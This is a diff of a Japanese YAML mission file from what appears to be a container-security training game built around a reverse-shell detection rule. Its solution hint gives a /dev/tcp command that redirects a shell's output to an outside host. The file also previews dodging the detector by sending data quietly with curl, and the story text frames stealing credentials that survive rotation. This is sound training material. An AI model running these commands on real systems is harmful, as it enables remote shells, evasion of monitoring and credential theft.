@@ -20,9 +20,21 @@ steps:
   - label: スコアボードで CLEARED を確認
     detail: 発火が scoreboard に届くと、このミッションが自動で CLEARED になる。
 hints:
-  - reverse shell が成立する仕組みを思い出そう。シェルの標準入出力は、一体何に繋ぎ変えられているのだろうか。
-  - bash の /dev/tcp/<host>/<port> で TCP socket を開き、fd リダイレクトで stdout/stdin に dup2 すると発火する。接続が成立する宛先が必要。
-  - "想定解: bash -c 'exec 1<>/dev/tcp/8.8.8.8/53' — <> が socket fd を stdout に dup する瞬間に発火。この先の回避ミッションでは逆に dup を避け curl で静かに送る。"
+  - kind: rule
+    text: >-
+      reverse shell が成立する仕組みを思い出そう。シェルの標準入出力は、一体何に
+      繋ぎ変えられているのだろうか。検知ルールは
+      Redirect STDOUT/STDIN to Network Connection in Container — socket fd を
+      標準入出力に dup した瞬間に発火する。
+    ruleRefs: [Redirect STDOUT/STDIN to Network Connection in Container]
+  - kind: command
+    text: >-
+      bash の /dev/tcp/<host>/<port> で TCP socket を開き、fd リダイレクトで
+      stdout/stdin に dup2 すると発火する。接続が成立する宛先が必要。/dev/tcp や
+      送信系のコマンド例はコマンド集『5. ネットワーク / 送信』にまとめてある。
+    cheatsheetRef: "5"
+  - kind: solution
+    text: "想定解: bash -c 'exec 1<>/dev/tcp/8.8.8.8/53' — <> が socket fd を stdout に dup する瞬間に発火。この先の回避ミッションでは逆に dup を避け curl で静かに送る。"
 bridge: >-
   C2 は開通した。あとは戦利品を運び出すだけ — だが運用側が credential を rotate すれば
   盗んだ鍵は無効になる。rotate されても中身が残る自分用のコピーを、先に確保しておく。
